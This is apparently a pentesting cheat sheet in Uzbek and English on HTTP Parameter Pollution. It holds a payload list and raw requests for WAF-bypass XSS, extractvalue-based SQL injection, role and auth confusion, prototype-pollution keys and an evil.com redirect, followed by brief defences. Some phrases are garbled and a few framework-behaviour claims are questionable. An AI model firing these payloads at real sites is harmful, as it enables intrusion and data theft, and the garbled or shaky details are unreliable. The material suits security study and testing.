# HTTP Parameter Pollution (HPP)

## 1. Ta'rif
HPP — bitta parametrni bir nechta qiymat bilan yuborish (`?a=1&a=2`). Server/framework qaysi birini tanlaydi? Farqli qismlari (WAF, app, framework, DB) turli tanlash qilsa — filterlar aylanib o'tiladi, admin check buziladi, query absorbing.

## 2. Qayerdan kelib chiqadi
- Frameworklar turlicha: PHP `last`, ASP `first+last` (comma), JSP/Tomcat `first+last`, Rails `last`, PHP `$_GET['a'] = last`
- WAF ko'pchilik `first` ni tekshiradi, app `last` ni ishlatadi → WAF bypass
- Query absorb: `?sort=name&sort=,id;--` — SQL injection via HPP
- Multi-value: `?role=user&role=admin`
- PHP: `?a=1&a=2` → `$_GET['a']` = "2" (last)
- Rails/Django: qaytaradi array → app `last`/`join` ishlatsa

## 3. Turlari
| Tur | Misol |
|-----|-------|
| Standard HPP | `?x=1&x=2` server picks 2 |
| WAF bypass | WAF tekshiradi` `first`, app `last` |
| HPP→SQLi | order parametr argv-ния |
| HPP→XSS | pair grep echo birinchi |
| HPP→auth | `user=attacker&user=admin` (check first, use second) |
| Array/object | `?x[]=1` Json decay |

## 4. Metodologiya
1. Parametr'ni aniqlang — server qaysi qiymatni oladi:
   ```
   ?search=aaaa&search=bbbb
   → response'da qaysi biri: aaaa / bbbb / boshqa? (test both)
   ```
   Variantlar: birinchi, oxirgi, comma qo'shilgan, array.
2. WAF bypass:
   - Zararli qiymat'ni keyin qo'ying: `?x=<script>&x=good` (WAF x da first tekshiradi — bypass)
   - Yoki `?x=good&x=<script>`
3. SQLi HPP (order-by):
   ```
   sort=name&sort=name,extractvalue(1,concat(0x7e,version()))
   ```
4. Auth: ikki qiymat bilan boshqa foydalanuvchi? `user=id1&user=id2`
5. Object key collision: `?a[__proto__][x]=1` etc; PHP `?a[b]=1&a[c]=2`.
6. Response text'da search: hamma qiymatlar yoki bittasi.

## 5. Payload'lar
```
/search?q=aaaa&q=bbbb                    # hangi tanlanadi
/search?q=aaaa%26q=bbbb                  # URL encode
/user?role=user&role=admin
/login?user=x&user=admin&pass=y&pass=z
/sort?sort=name;&sort=,1 --                    # SQLi
/?a%5B%5D=1&a%5B%5D=2                      # array
/filter?type=img&type=script&type=svg
?redirect=../&redirect=https://evil.com
```
## 6. Request misollari
```
GET /search?q=<script>alert(1)</script>&q=safe HTTP/1.1
Host: target.com
# WAF q da first blast; app q last ni echo qilsa → XSS

GET /products?sort=price&sort=price,extractvalue(1,concat(0x7e,version())) HTTP/1.1
```
## 7. Zaif code misollari
```php
// ZAIF: app last ni oladi
$x = $_GET['q'];   // ?q=1&q=2 → "2"
echo "Siz qidirdingiz: $x";  // second value (XSS)

// WAF: faqat birinchi value tekshiradi -> bypass
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Har bir parametr uchun duplicate — server tanlovini aniqlash
- [ ] WAF + app farqi (bypass test)
- [ ] Array & key collision `a[b]`
- [ ] HPP→injection (SQL/NoSQL/XSS) — order, search, filter
- [ ] Multi-peak auth — bir qiymat check, boshqa use
- [ ] URL + body (query param + POST param) — paradoksal оеsh
## 9. Himoya
- Single source of truth for params (reject duplicates)
- Escape output per context; param always sanitized once
- WAF + app use same parsing; normalize input
- Validate against schema (types, allowed values)